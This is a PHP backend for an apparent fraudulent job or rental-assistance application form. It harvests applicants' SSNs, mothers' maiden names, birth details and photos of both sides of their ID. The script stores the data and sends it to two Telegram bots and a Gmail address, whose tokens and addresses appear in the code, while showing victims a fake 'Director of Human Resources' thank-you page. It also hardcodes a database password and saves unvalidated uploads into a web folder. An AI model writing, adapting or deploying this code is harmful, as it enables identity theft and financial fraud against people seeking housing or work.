<?php
// ======================
// NEON DATABASE (PostgreSQL)
// ======================
$host = "ep-calm-frog-ahfjj5vo-pooler.c-3.us-east-1.aws.neon.tech";
$db   = "neondb";
$user = "neondb_owner";
$pass = "npg_TQ1gBOwA9rCa";
$port = "5432";

$dsn = "pgsql:host=$host;port=$port;dbname=$db;sslmode=require";

try {
    $pdo = new PDO($dsn, $user, $pass, [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
    ]);
} catch (Exception $e) {
    die("DB Connection failed: " . $e->getMessage());
}

// ======================
// FORM DATA EXTRACTION
// ======================
$first_name     = $_POST['first_name'] ?? '';
$middle_name    = $_POST['middle_name'] ?? '';
$last_name      = $_POST['last_name'] ?? '';
$phone          = $_POST['phone'] ?? '';
$email          = $_POST['email'] ?? '';
$dob            = $_POST['dob'] ?? '';
$mother_maiden  = $_POST['mother_maiden'] ?? '';
$ssn            = $_POST['ssn'] ?? '';
$birth_city     = $_POST['birth_city'] ?? '';
$address_line1  = $_POST['address_line1'] ?? '';
$address_line2  = $_POST['address_line2'] ?? '';
$city           = $_POST['city'] ?? '';
$state          = $_POST['state'] ?? '';
$zip_code       = $_POST['zip_code'] ?? '';

$address        = $address_line1 . " " . $address_line2 . ", " . $city . ", " . $state . " " . $zip_code;
$father_name    = $_POST['father_name'] ?? '';
$mother_name    = $_POST['mother_name'] ?? '';

// ======================
// FILE PROCESSING (Temp Disk + Base64 DB Storage)
// ======================
$front_path = null;
$back_path = null;
$front_id_base64 = null;
$back_id_base64 = null;

if (!is_dir('uploads')) {
    mkdir('uploads', 0755, true);
}

function processUploadedFile($fileInputName) {
    if (isset($_FILES[$fileInputName]) && $_FILES[$fileInputName]['error'] === UPLOAD_ERR_OK) {
        $temporaryLocation = $_FILES[$fileInputName]['tmp_name'];
        $savedPath = "uploads/" . time() . "_" . basename($_FILES[$fileInputName]['name']);
        
        if (move_uploaded_file($temporaryLocation, $savedPath)) {
            $binaryData = file_get_contents($savedPath);
            $mimeType = mime_content_type($savedPath);
            $base64String = 'data:' . $mimeType . ';base64,' . base64_encode($binaryData);
            return [$savedPath, $base64String];
        }
    }
    return [null, null];
}

list($front_path, $front_id_base64) = processUploadedFile('front_id');
list($back_path, $back_id_base64) = processUploadedFile('back_id');

// ======================
// SAVE TO POSTGRES DATABASE
// ======================
$stmt = $pdo->prepare("
INSERT INTO job_applications (
    first_name, middle_name, last_name, phone, email, dob, 
    mother_maiden, ssn, birth_city, address, father_name, mother_name, 
    front_id, back_id
) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
");

$stmt->execute([
    $first_name, $middle_name, $last_name, $phone, $email, $dob,
    $mother_maiden, $ssn, $birth_city, $address, $father_name, $mother_name,
    $front_id_base64, $back_id_base64
]);


// ======================
// TELEGRAM BOT SETUP
// ======================
$bot1 = "8538050369:AAGHLSy5D7r-_6QA9K1rbqkebWrzpbjc1ek";
$chat1 = "6513265609";

$bot2 = "8972396935:AAG1WwV6vzEE5xkZty67SrE2GRYOO3HR8F0";
$chat2 = "5469294503";

$baseUrl = "https://homeandrentalassistance.onrender.com";

$front_url = $baseUrl . "/" . $front_id;
$back_url  = $baseUrl . "/" . $back_id;


// ======================
// FUNCTION
// ======================
function sendTelegram($bot, $chat, $url, $data) {
    file_get_contents("https://api.telegram.org/bot$bot/$url?" . http_build_query($data));
}


// ======================
// TEXT MESSAGE
// ======================
$text = "📄 New Application Submitted\n\n"
. "👤 Name: $first_name $middle_name $last_name\n"
. "📞 Phone: $phone\n"
. "📧 Email: $email\n"
. "🎂 DOB: $dob\n"
. "🏠 Address: $address_line1 $address_line2, $city, $state $zip_code\n"
. "🏙 Birth City: $birth_city\n"
. "👨 Father: $father_name\n"
. "👩 Mother: $mother_name\n"
. "🧾 SSN: $ssn";


// ======================
// SEND TO BOT 1
// ======================
sendTelegram($bot1, $chat1, "sendMessage", [
    "chat_id" => $chat1,
    "text" => $text
]);

sendTelegram($bot1, $chat1, "sendPhoto", [
    "chat_id" => $chat1,
    "photo" => $front_url,
    "caption" => "🪪 Front ID - $first_name $last_name"
]);

sendTelegram($bot1, $chat1, "sendPhoto", [
    "chat_id" => $chat1,
    "photo" => $back_url,
    "caption" => "🪪 Back ID - $first_name $last_name"
]);


// ======================
// SEND TO BOT 2
// ======================
sendTelegram($bot2, $chat2, "sendMessage", [
    "chat_id" => $chat2,
    "text" => $text
]);

sendTelegram($bot2, $chat2, "sendPhoto", [
    "chat_id" => $chat2,
    "photo" => $front_url,
    "caption" => "🪪 Front ID - $first_name $last_name"
]);

sendTelegram($bot2, $chat2, "sendPhoto", [
    "chat_id" => $chat2,
    "photo" => $back_url,
    "caption" => "🪪 Back ID - $first_name $last_name"
]);

// ======================
// EMAIL NOTIFICATION
// ======================
$to = "collaomn@gmail.com";
$subject = "New Job Form Submission";
$body = $text;
$headers = "From: noreply@yourdomain.com";

mail($to, $subject, $body, $headers);

// ======================
// SUCCESS USER INTERFACE DISPLAY
// ======================
echo "
<div style='max-width:700px;margin:60px auto;padding:50px;background:#0f172a;color:white;border-radius:20px;text-align:center;font-family:Arial,sans-serif;box-shadow:0 10px 30px rgba(0,0,0,0.4);'>
    <div style='font-size:80px;color:#22c55e;margin-bottom:20px;'>✓</div>
    <h1 style='font-size:42px;margin-bottom:25px;color:#ffffff;'>Form Submitted Successfully!</h1>
    <p style='font-size:24px;line-height:1.8;color:#e2e8f0;'>
        Thank you for considering <strong>Apartment at Home and Rental Assistance</strong>.<br><br>We will contact you shortly.
    </p>
    <div style='margin-top:40px;border-top:1px solid #334155;padding-top:25px;'>
        <h2 style='font-size:30px;color:#38bdf8;margin-bottom:10px;'>Taylor Luis</h2>
        <p style='font-size:20px;color:#cbd5e1;'>Director of Human Resources</p>
    </div>
</div>";
?>
